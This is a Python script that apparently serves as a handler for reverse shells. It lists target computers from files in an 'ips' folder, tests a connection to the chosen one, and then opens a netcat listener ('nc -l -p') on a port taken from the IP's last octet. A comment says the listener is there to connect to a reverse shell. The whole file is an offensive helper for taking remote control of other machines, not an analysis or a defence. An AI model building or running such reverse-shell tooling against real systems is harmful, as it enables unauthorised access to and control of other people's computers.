import socket
import os

PRETTY_UI = True

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def index_files(directory):
    file_dict = {}
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'r') as f:
                content = f.read()
                file_dict[file] = content
    return file_dict

def connect(ip, port):
    try:
        # Create a socket object
        client_socket = socket.create_connection((ip, port), timeout=5)

        # Connection successful
        print(f"Connection to {ip}:{port} successful.")
        client_socket.close()
        return True

    except socket.error as e:
        # Connection failed
        print(f"Connection to {ip}:{port} failed. Error: {e}")
        return False

if __name__ == "__main__":
    clear()
    ips = f'{os.getcwd()}\\ips'
    file_dict = index_files(ips)
    # print(file_dict)

    if PRETTY_UI:
        import inquirer
        # array of file names with content
        file_options = []
        for item , value in file_dict.items():
            file_options.append(f"{item} : {value}")

        # print(file_options)

        questions = [
            inquirer.List(
                "computer",
                message="What computer do you want to connect to?",
                choices=file_options,
            ),
        ]

        answers = inquirer.prompt(questions)
        selected = answers["computer"].split(':')[0][:-1] # get the name of the computer and remove the space
    else:
        for item , value in file_dict.items():
            print(f'{item} : {value}')

        selected = input('Select a Computer: ')

    clear()
    print(f'You selected {selected}')
    IP = file_dict[selected]
    PORT = int(IP.split('.')[-1])

    print(f'Connecting to {selected}: {IP}:{PORT}')
    connected = connect(IP, PORT)
    if connected:
        print("IMPORTANT: Always exit the shell by typing 'exit'.")
        # print("Connection successful.")
        os.system(f"start nc -l -p {PORT}") # Connect to reverse shell
    else:
        # print("Connection failed.")
        pass
